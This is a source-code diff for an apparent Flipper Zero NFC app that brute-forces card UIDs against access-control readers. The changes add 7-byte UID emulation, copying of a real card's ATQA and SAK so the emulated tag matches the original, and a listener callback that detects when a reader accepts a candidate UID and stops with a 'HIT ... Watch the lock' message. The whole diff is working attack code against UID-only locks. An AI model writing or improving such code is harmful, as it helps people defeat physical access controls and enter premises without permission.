@@ -45,6 +45,7 @@
 #include <nfc/nfc_poller.h>
 #include <nfc/helpers/nfc_supported_cards.h>
 #include <nfc/protocols/iso14443_3a/iso14443_3a.h>
+#include <nfc/protocols/iso14443_3a/iso14443_3a_listener.h>
 #include <nfc/nfc_listener.h>
 
 #include "pattern_engine.h"
@@ -80,15 +81,22 @@
 
 // NFC constants
 #define STANDARD_UID_LENGTH 4
+#define EXTENDED_UID_LENGTH 7
+#define EXTENDED_UID_PREFIX_LENGTH 3
 #define MAX_UID_LENGTH 10
 #define MAX_FILE_SIZE (1024 * 1024) // 1MB
 #define ATQA_DEFAULT_LOW 0x00
 #define ATQA_DEFAULT_HIGH 0x04
+#define ATQA_DEFAULT_HIGH_UID7 0x44
 #define SAK_DEFAULT 0x08
 
 // Enhanced key storage structure
 typedef struct {
-    uint32_t uid;
+    uint32_t uid;                       // full value for 4-byte UIDs, variable low 4 bytes for 7-byte UIDs
+    uint8_t uid_len;                    // 4 or 7
+    uint8_t uid_prefix[EXTENDED_UID_PREFIX_LENGTH]; // first 3 bytes of a 7-byte UID (fixed manufacturer part)
+    uint8_t atqa[2];
+    uint8_t sak;
     char* name;
     char* file_path;
     uint32_t loaded_time;
@@ -99,6 +107,10 @@ typedef struct {
 typedef struct {
     uint32_t uids[MAX_UIDS];
     uint8_t uid_count;
+    uint8_t uid_len;                              // 4 or 7, taken from the first loaded card
+    uint8_t uid_prefix[EXTENDED_UID_PREFIX_LENGTH]; // fixed part of a 7-byte UID
+    uint8_t atqa[2];
+    uint8_t sak;
     PatternType pattern;
     uint32_t start_uid;
     uint32_t end_uid;
@@ -108,6 +120,7 @@ typedef struct {
     uint32_t delay_ms;
     uint32_t pause_every;
     uint32_t pause_duration_s;
+    bool stop_on_hit;  // stop the run when a reader accepts a candidate UID
     bool is_running;
     bool should_stop;
     uint32_t total_attempts;
@@ -124,6 +137,7 @@ typedef enum {
     UidBruteSmarterViewBrute,
     UidBruteSmarterViewMenu,
     UidBruteSmarterViewKeyList,
+    UidBruteSmarterViewPopup,
     UidBruteSmarterViewAbout
 } UidBruteSmarterView;
 
@@ -156,6 +170,14 @@ typedef struct {
     bool is_view_transitioning;  // Flag to prevent race conditions during view changes
     uint32_t last_key_event_time;  // Timestamp of last key event for debouncing
     char brute_header[32];  // Buffer for brute force header text with pattern name
+
+    // Hit detection: written by the NFC listener callback (NFC thread),
+    // read by the brute timer callback (timer thread). Plain volatiles are
+    // sufficient: single producer, single-word flags only.
+    volatile bool hit_detected;          // reader sent a CRC-valid command to the emulated UID
+    volatile uint32_t hit_uid;           // candidate UID that was engaged
+    volatile uint32_t reader_engagements; // total post-selection commands seen
+    volatile uint32_t reader_halted;      // total HLTA events seen (weak signal)
 } UidBruteSmarter;
 
 // Forward declarations
@@ -169,9 +191,42 @@ static uint32_t uid_brute_smarter_brute_back_callback(void* context);
 static void uid_brute_smarter_timer_callback(void* context);
 static void uid_brute_smarter_emulate_uid(UidBruteSmarter* instance, uint32_t uid);
 static void uid_brute_smarter_safe_switch_view(UidBruteSmarter* instance, UidBruteSmarterView view);
+
+// NFC listener callback: runs in the NFC worker thread while a candidate UID
+// is being emulated. A reader that selects our UID and then issues a
+// CRC-valid command (e.g. an authentication attempt) is treating it as a real
+// card, which is the acceptance signal for UID-only access systems. HLTA
+// after selection is a weaker hint and is only counted.
+static NfcCommand uid_brute_smarter_listener_callback(NfcGenericEvent event, void* context) {
+    UidBruteSmarter* instance = (UidBruteSmarter*)context;
+
+    if(event.protocol != NfcProtocolIso14443_3a || event.event_data == NULL) {
+        return NfcCommandContinue;
+    }
+
+    const Iso14443_3aListenerEvent* listener_event = event.event_data;
+    switch(listener_event->type) {
+    case Iso14443_3aListenerEventTypeReceivedData:
+    case Iso14443_3aListenerEventTypeReceivedStandardFrame:
+        if(!instance->hit_detected) {
+            instance->hit_detected = true;
+            instance->hit_uid = instance->app->current_uid;
+        }
+        instance->reader_engagements++;
+        break;
+    case Iso14443_3aListenerEventTypeHalted:
+        instance->reader_halted++;
+        break;
+    default:
+        break;
+    }
+
+    return NfcCommandContinue;
+}
 static bool uid_brute_smarter_is_key_debounced(UidBruteSmarter* instance);
 static uint32_t uid_brute_smarter_about_back_callback(void* context);
 static uint32_t uid_brute_smarter_calculate_uid(UidBruteSmarter* instance, uint32_t iteration);
+static void uid_brute_smarter_hit_popup_callback(void* context);
 
 // Calculate UID on-the-fly based on pattern and iteration number
 static uint32_t uid_brute_smarter_calculate_uid(UidBruteSmarter* instance, uint32_t iteration) {
@@ -361,6 +416,7 @@ static void uid_brute_smarter_free(UidBruteSmarter* instance) {
     view_dispatcher_remove_view(instance->view_dispatcher, UidBruteSmarterViewBrute);
     view_dispatcher_remove_view(instance->view_dispatcher, UidBruteSmarterViewMenu);
     view_dispatcher_remove_view(instance->view_dispatcher, UidBruteSmarterViewKeyList);
+    view_dispatcher_remove_view(instance->view_dispatcher, UidBruteSmarterViewPopup);
     view_dispatcher_remove_view(instance->view_dispatcher, UidBruteSmarterViewAbout);
 
     // Free GUI components
@@ -422,6 +478,11 @@ static UidBruteSmarter* uid_brute_smarter_alloc(void) {
     instance->app->delay_ms = DEFAULT_DELAY_MS;
     instance->app->pause_every = DEFAULT_PAUSE_EVERY;
     instance->app->pause_duration_s = DEFAULT_PAUSE_DURATION_S;
+    instance->app->stop_on_hit = true;
+    instance->app->uid_len = STANDARD_UID_LENGTH;
+    instance->app->atqa[0] = ATQA_DEFAULT_LOW;
+    instance->app->atqa[1] = ATQA_DEFAULT_HIGH;
+    instance->app->sak = SAK_DEFAULT;
     
     // Open GUI record
     instance->gui = furi_record_open(RECORD_GUI);
@@ -461,27 +522,47 @@ static UidBruteSmarter* uid_brute_smarter_alloc(void) {
     view_dispatcher_add_view(
         instance->view_dispatcher, UidBruteSmarterViewKeyList, submenu_get_view(instance->key_list_submenu));
     view_dispatcher_add_view(
+        instance->view_dispatcher, UidBruteSmarterViewPopup, popup_get_view(instance->popup));
+    view_dispatcher_add_view(
         instance->view_dispatcher, UidBruteSmarterViewAbout, instance->about_view);
     
     return instance;
 }
 
-static void uid_brute_smarter_add_key(UidBruteSmarter* instance, const char* filename, uint32_t uid) {
+static void uid_brute_smarter_add_key(
+    UidBruteSmarter* instance,
+    const char* filename,
+    uint32_t uid,
+    uint8_t uid_len,
+    const uint8_t* uid_prefix,
+    const uint8_t atqa[2],
+    uint8_t sak) {
     DEBUG_LOG("[ADD_KEY] Starting add_key with count: %d, uid: %08lX", instance->loaded_keys_count, uid);
-    
+
     if(!instance || !filename) {
         ERROR_LOG("[ADD_KEY] NULL instance or filename");
         return;
     }
-    
+
     if(instance->loaded_keys_count >= MAX_UIDS) {
         ERROR_LOG("[ADD_KEY] Max keys reached (%d)", MAX_UIDS);
         return;
     }
-    
+
     int index = instance->loaded_keys_count;
-    
+
     instance->loaded_keys[index].uid = uid;
+    instance->loaded_keys[index].uid_len = uid_len;
+    if(uid_len == EXTENDED_UID_LENGTH && uid_prefix != NULL) {
+        memcpy(instance->loaded_keys[index].uid_prefix, uid_prefix, EXTENDED_UID_PREFIX_LENGTH);
+    } else {
+        memset(instance->loaded_keys[index].uid_prefix, 0, EXTENDED_UID_PREFIX_LENGTH);
+    }
+    instance->loaded_keys[index].atqa[0] = atqa ? atqa[0] : ATQA_DEFAULT_LOW;
+    instance->loaded_keys[index].atqa[1] =
+        atqa ? atqa[1] :
+               (uid_len == EXTENDED_UID_LENGTH ? ATQA_DEFAULT_HIGH_UID7 : ATQA_DEFAULT_HIGH);
+    instance->loaded_keys[index].sak = sak ? sak : SAK_DEFAULT;
     instance->loaded_keys[index].loaded_time = furi_get_tick();
     instance->loaded_keys[index].is_active = true;
     
@@ -505,6 +586,14 @@ static void uid_brute_smarter_add_key(UidBruteSmarter* instance, const char* fil
     
     // Add to app uids
     if(instance->app->uid_count < MAX_UIDS) {
+        if(instance->app->uid_count == 0) {
+            // First card defines the tag characteristics for the whole run
+            instance->app->uid_len = uid_len;
+            memcpy(instance->app->uid_prefix, instance->loaded_keys[index].uid_prefix, EXTENDED_UID_PREFIX_LENGTH);
+            instance->app->atqa[0] = instance->loaded_keys[index].atqa[0];
+            instance->app->atqa[1] = instance->loaded_keys[index].atqa[1];
+            instance->app->sak = instance->loaded_keys[index].sak;
+        }
         instance->app->uids[instance->app->uid_count] = uid;
         instance->app->uid_count++;
     }
@@ -539,6 +628,15 @@ static void uid_brute_smarter_remove_key(UidBruteSmarter* instance, uint8_t inde
     }
     
     instance->loaded_keys_count--;
+
+    // When the last key goes away the tag characteristics must not survive
+    if(instance->app->uid_count == 0) {
+        instance->app->uid_len = STANDARD_UID_LENGTH;
+        memset(instance->app->uid_prefix, 0, EXTENDED_UID_PREFIX_LENGTH);
+        instance->app->atqa[0] = ATQA_DEFAULT_LOW;
+        instance->app->atqa[1] = ATQA_DEFAULT_HIGH;
+        instance->app->sak = SAK_DEFAULT;
+    }
 }
 
 static void uid_brute_smarter_key_list_callback(void* context, uint32_t index) {
@@ -578,9 +676,18 @@ static void uid_brute_smarter_show_key_list(UidBruteSmarter* instance) {
     
     for(int i = 0; i < instance->loaded_keys_count; i++) {
         char item_text[64];
-        snprintf(item_text, sizeof(item_text), "%s (%08lX)", 
-                 instance->loaded_keys[i].name, 
-                 instance->loaded_keys[i].uid);
+        if(instance->loaded_keys[i].uid_len == EXTENDED_UID_LENGTH) {
+            snprintf(item_text, sizeof(item_text), "%s (%02X%02X%02X%08lX)",
+                     instance->loaded_keys[i].name,
+                     instance->loaded_keys[i].uid_prefix[0],
+                     instance->loaded_keys[i].uid_prefix[1],
+                     instance->loaded_keys[i].uid_prefix[2],
+                     instance->loaded_keys[i].uid);
+        } else {
+            snprintf(item_text, sizeof(item_text), "%s (%08lX)",
+                     instance->loaded_keys[i].name,
+                     instance->loaded_keys[i].uid);
+        }
         submenu_add_item(instance->key_list_submenu, item_text, i, uid_brute_smarter_key_list_callback, instance);
         DEBUG_LOG("[KEY_LIST] Added key item: %s", item_text);
     }
@@ -670,52 +777,62 @@ static bool uid_brute_smarter_load_nfc_file(UidBruteSmarter* instance, const cha
     }
     
     // Validate the data structure
-    if(iso_data->uid_len == 0 || iso_data->uid_len > MAX_UID_LENGTH) {
-        ERROR_LOG("Invalid UID length: %d (must be 4-10 bytes)", iso_data->uid_len);
+    if(iso_data->uid_len != STANDARD_UID_LENGTH &&
+       iso_data->uid_len != EXTENDED_UID_LENGTH) {
+        ERROR_LOG("Unsupported UID length: %d (expected 4 or 7 bytes)", iso_data->uid_len);
         goto cleanup;
     }
-    
+
     if(instance->app->uid_count >= MAX_UIDS) {
         ERROR_LOG("Maximum UIDs reached (%d)", MAX_UIDS);
         goto cleanup;
     }
-    
-    DEBUG_LOG("ISO14443-3a data found, UID length: %d, ATQA: 0x%04X, SAK: 0x%02X", 
-              iso_data->uid_len, iso_data->atqa[0] | (iso_data->atqa[1] << 8), iso_data->sak);
-    
-    if(iso_data->uid_len == 0 || iso_data->uid_len > STANDARD_UID_LENGTH) {
-        ERROR_LOG("Invalid UID length: %d (expected 4 bytes)", iso_data->uid_len);
+
+    // All cards in one audit must share the UID size, otherwise pattern
+    // detection would compare unrelated value spaces.
+    if(instance->app->uid_count > 0 && instance->app->uid_len != iso_data->uid_len) {
+        ERROR_LOG(
+            "Mixed UID lengths: loaded cards use %u bytes, file uses %u",
+            instance->app->uid_len,
+            iso_data->uid_len);
         goto cleanup;
     }
-    
+
+    DEBUG_LOG("ISO14443-3a data found, UID length: %d, ATQA: 0x%04X, SAK: 0x%02X",
+              iso_data->uid_len, iso_data->atqa[0] | (iso_data->atqa[1] << 8), iso_data->sak);
+
+    uint8_t uid_len = iso_data->uid_len;
+    uint8_t uid_prefix[EXTENDED_UID_PREFIX_LENGTH] = {0};
+    if(uid_len == EXTENDED_UID_LENGTH) {
+        // Keep the manufacturer prefix fixed; only the low 4 bytes vary.
+        memcpy(uid_prefix, iso_data->uid, EXTENDED_UID_PREFIX_LENGTH);
+    }
+
     // Validate UID bytes with enhanced bounds checking
     uint32_t uid = 0;
-    uint8_t uid_len = MIN(iso_data->uid_len, STANDARD_UID_LENGTH);
-    
-    if(uid_len == 0 || uid_len > MAX_UID_LENGTH) {
-        ERROR_LOG("Invalid UID length %d in file: %s (expected 1-%d)", uid_len, path, MAX_UID_LENGTH);
-        goto cleanup;
-    }
-    
+
     DEBUG_LOG("UID bytes:");
-    for(uint8_t i = 0; i < uid_len && i < MAX_UID_LENGTH; i++) {
+    for(uint8_t i = 0; i < uid_len; i++) {
         DEBUG_LOG("  UID[%d] = 0x%02X", i, iso_data->uid[i]);
+    }
+    for(uint8_t i = EXTENDED_UID_PREFIX_LENGTH; i < uid_len; i++) {
         uid |= ((uint32_t)iso_data->uid[i]) << (8 * (uid_len - 1 - i));
     }
-    
-    // Basic UID validation (not all zeros or all 0xFF)
+
+    // Basic UID validation (variable part not all zeros or all 0xFF)
     uint32_t all_zeros = 0x00000000;
     uint32_t all_ones = 0xFFFFFFFF;
-    
+
     if(uid == all_zeros || uid == all_ones) {
         ERROR_LOG("Invalid UID value: 0x%08lX", uid);
         goto cleanup;
     }
-    
+
     DEBUG_LOG("Extracted valid UID: 0x%08lX", uid);
-    
+
     // Store the key with enhanced info
-    uid_brute_smarter_add_key(instance, path, uid);
+    uid_brute_smarter_add_key(
+        instance, path, uid, uid_len, uid_prefix, iso_data->atqa, iso_data->sak);
     success = true;
 
 cleanup:
@@ -756,7 +873,7 @@ static void uid_brute_smarter_menu_callback(void* context, uint32_t index) {
                     if(uid_brute_smarter_load_nfc_file(instance, path)) {
                         popup_set_header(instance->popup, "Card Loaded", 64, 20, AlignCenter, AlignTop);
                         char progress_text[32];
-                        snprintf(progress_text, sizeof(progress_text), "%d UIDs loaded", 
+                        snprintf(progress_text, sizeof(progress_text), "%d UIDs loaded",
                                  instance->loaded_keys_count);
                         popup_set_text(instance->popup, progress_text, 64, 40, AlignCenter, AlignTop);
                     } else {
@@ -765,8 +882,10 @@ static void uid_brute_smarter_menu_callback(void* context, uint32_t index) {
                     }
                     popup_set_timeout(instance->popup, POPUP_TIMEOUT_MS);
                     popup_enable_timeout(instance->popup);
+                    popup_set_callback(instance->popup, uid_brute_smarter_hit_popup_callback);
+                    popup_set_context(instance->popup, instance);
                     uid_brute_smarter_setup_menu(instance);
-                    uid_brute_smarter_safe_switch_view(instance, UidBruteSmarterViewMenu);
+                    uid_brute_smarter_safe_switch_view(instance, UidBruteSmarterViewPopup);
                 }
                 
                 furi_string_free(file_path);
@@ -837,6 +956,46 @@ static void uid_brute_smarter_timer_callback(void* context) {
         return;
     }
 
+    // Hit detection: if the reader engaged the previously emulated UID and
+    // stop-on-hit is configured, finish the run with the accepted candidate
+    // instead of stepping further.
+    if(instance->hit_detected && instance->app->stop_on_hit) {
+        uint32_t accepted_uid = instance->hit_uid;
+        DEBUG_LOG("[TIMER] Reader accepted UID %08lX, stopping", accepted_uid);
+        furi_timer_stop(instance->brute_timer);
+        instance->app->is_running = false;
+
+        if(instance->listener) {
+            nfc_listener_stop(instance->listener);
+            nfc_listener_free(instance->listener);
+            instance->listener = NULL;
+        }
+        if(instance->nfc_device) {
+            nfc_device_clear(instance->nfc_device);
+        }
+
+        char hit_text[80];
+        snprintf(
+            hit_text,
+            sizeof(hit_text),
+            "Reader accepted UID:\n%02X%02X%02X%08lX\nWatch the lock...",
+            instance->app->uid_prefix[0],
+            instance->app->uid_prefix[1],
+            instance->app->uid_prefix[2],
+            accepted_uid);
+        if(instance->app->uid_len != EXTENDED_UID_LENGTH) {
+            snprintf(hit_text, sizeof(hit_text), "Reader accepted UID:\n%08lX\nWatch the lock...", accepted_uid);
+        }
+        popup_set_header(instance->popup, "HIT", 64, 12, AlignCenter, AlignTop);
+        popup_set_text(instance->popup, hit_text, 64, 36, AlignCenter, AlignTop);
+        popup_set_timeout(instance->popup, 4000);
+        popup_enable_timeout(instance->popup);
+        popup_set_callback(instance->popup, uid_brute_smarter_hit_popup_callback);
+        popup_set_context(instance->popup, instance);
+        uid_brute_smarter_safe_switch_view(instance, UidBruteSmarterViewPopup);
+        return;
+    }
+
     // Check if we should stop
     if(instance->app->should_stop) {
         DEBUG_LOG("[TIMER] Stop requested, cleaning up");
@@ -890,13 +1049,15 @@ static void uid_brute_smarter_timer_callback(void* context) {
     DEBUG_LOG("[TIMER] Processing UID %08lX (iteration %lu/%lu)",
               current_uid, instance->current_iteration + 1, instance->app->total_range_size);
 
-    // Update progress display with 3-line format
+    // Update progress display with reader engagement feedback
     char progress_text[64];
     snprintf(progress_text, sizeof(progress_text),
-        "UID: %08lX  %lu/%lu",
+        "UID: %08lX  %lu/%lu\nReader cmds: %lu  HALT: %lu",
         current_uid,
         instance->current_iteration + 1,
-        instance->app->total_range_size);
+        instance->app->total_range_size,
+        instance->reader_engagements,
+        instance->reader_halted);
     dialog_ex_set_text(instance->dialog_ex, progress_text, 64, 32, AlignCenter, AlignCenter);
 
     // Emulate this UID with timeout protection
@@ -962,18 +1123,25 @@ static void uid_brute_smarter_emulate_uid(UidBruteSmarter* instance, uint32_t ui
     
     // Set UID data
     iso14443_3a_reset(iso_data);
-    const uint8_t uid_bytes[4] = {
-        (uint8_t)((uid >> 24) & 0xFF),
-        (uint8_t)((uid >> 16) & 0xFF),
-        (uint8_t)((uid >> 8) & 0xFF),
-        (uint8_t)(uid & 0xFF),
-    };
-    iso14443_3a_set_uid(iso_data, uid_bytes, STANDARD_UID_LENGTH);
-    
-    // Set ATQA and SAK
-    const uint8_t atqa_bytes[2] = {ATQA_DEFAULT_LOW, ATQA_DEFAULT_HIGH};
+    UidBruteSmartApp* app = instance->app;
+    uint8_t uid_bytes[EXTENDED_UID_LENGTH] = {0};
+    uint8_t uid_len = app->uid_len == EXTENDED_UID_LENGTH ? EXTENDED_UID_LENGTH : STANDARD_UID_LENGTH;
+    if(uid_len == EXTENDED_UID_LENGTH) {
+        // 7-byte UID: fixed manufacturer prefix + variable low 4 bytes.
+        // The pattern engine plans the range over the variable part only.
+        memcpy(uid_bytes, app->uid_prefix, EXTENDED_UID_PREFIX_LENGTH);
+    }
+    uid_bytes[uid_len - 4] = (uint8_t)((uid >> 24) & 0xFF);
+    uid_bytes[uid_len - 3] = (uint8_t)((uid >> 16) & 0xFF);
+    uid_bytes[uid_len - 2] = (uint8_t)((uid >> 8) & 0xFF);
+    uid_bytes[uid_len - 1] = (uint8_t)(uid & 0xFF);
+    iso14443_3a_set_uid(iso_data, uid_bytes, uid_len);
+
+    // Set ATQA and SAK taken from the audited card so the reader sees the
+    // same tag characteristics as the original (UID size bits included).
+    const uint8_t atqa_bytes[2] = {app->atqa[0], app->atqa[1]};
     iso14443_3a_set_atqa(iso_data, atqa_bytes);
-    iso14443_3a_set_sak(iso_data, SAK_DEFAULT);
+    iso14443_3a_set_sak(iso_data, app->sak);
     
     // Set data in NFC device
     nfc_device_clear(instance->nfc_device);
@@ -991,8 +1159,8 @@ static void uid_brute_smarter_emulate_uid(UidBruteSmarter* instance, uint32_t ui
         ERROR_LOG("[EMULATE] Failed to allocate NFC listener for UID: %08lX", uid);
         goto cleanup;
     }
-    
-    nfc_listener_start(instance->listener, NULL, NULL);
+
+    nfc_listener_start(instance->listener, uid_brute_smarter_listener_callback, instance);
     // Note: nfc_listener_start doesn't return a value, so we assume it succeeds
     // If there are issues, they'll be handled by the NFC system itself
     
@@ -1077,6 +1245,10 @@ static void uid_brute_smarter_start_brute_force(UidBruteSmarter* instance) {
     instance->app->total_attempts = 0;
     instance->app->pause_counter = 0;
     instance->app->timer_period_elevated = false;
+    instance->hit_detected = false;
+    instance->hit_uid = 0;
+    instance->reader_engagements = 0;
+    instance->reader_halted = 0;
 
     // Set header with pattern name
     snprintf(instance->brute_header, sizeof(instance->brute_header), "BF: %s", pattern_engine_get_name(result.type));
@@ -1138,6 +1310,16 @@ static void uid_brute_smarter_config_pause_duration_change(VariableItem* item) {
     variable_item_set_current_value_text(item, duration_str);
 }
 
+static const char* const stop_on_hit_names[] = {"Off", "On"};
+
+static void uid_brute_smarter_config_stop_on_hit_change(VariableItem* item) {
+    UidBruteSmarter* instance = (UidBruteSmarter*)variable_item_get_context(item);
+    uint8_t index = variable_item_get_current_value_index(item);
+
+    instance->app->stop_on_hit = (index != 0);
+    variable_item_set_current_value_text(item, stop_on_hit_names[index]);
+}
+
 static uint32_t uid_brute_smarter_config_back_callback(void* context) {
     UNUSED(context);
     
@@ -1155,10 +1337,18 @@ static uint32_t uid_brute_smarter_key_list_back_callback(void* context) {
 
 static uint32_t uid_brute_smarter_about_back_callback(void* context) {
     UNUSED(context);
-    
+
     DEBUG_LOG("[ABOUT] Back button pressed, returning to main menu");
-    
+
     return UidBruteSmarterViewMenu;
+}
+
+static void uid_brute_smarter_hit_popup_callback(void* context) {
+    UidBruteSmarter* instance = (UidBruteSmarter*)context;
+
+    DEBUG_LOG("[POPUP] Popup done, returning to main menu");
+
+    uid_brute_smarter_safe_switch_view(instance, UidBruteSmarterViewMenu);
 }
 
 static uint32_t uid_brute_smarter_brute_back_callback(void* context) {
@@ -1240,6 +1430,16 @@ static void uid_brute_smarter_setup_config(UidBruteSmarter* instance) {
     snprintf(value_str, sizeof(value_str), "%lu s", instance->app->pause_duration_s);
     variable_item_set_current_value_index(item, instance->app->pause_duration_s);
     variable_item_set_current_value_text(item, value_str);
+
+    // Stop the run when a reader engages the emulated UID
+    item = variable_item_list_add(
+        instance->variable_item_list,
+        "Stop on Hit",
+        COUNT_OF(stop_on_hit_names),
+        uid_brute_smarter_config_stop_on_hit_change,
+        instance);
+    variable_item_set_current_value_index(item, instance->app->stop_on_hit ? 1 : 0);
+    variable_item_set_current_value_text(item, stop_on_hit_names[instance->app->stop_on_hit ? 1 : 0]);
     
     // Set previous callback to handle back button
     view_set_previous_callback(
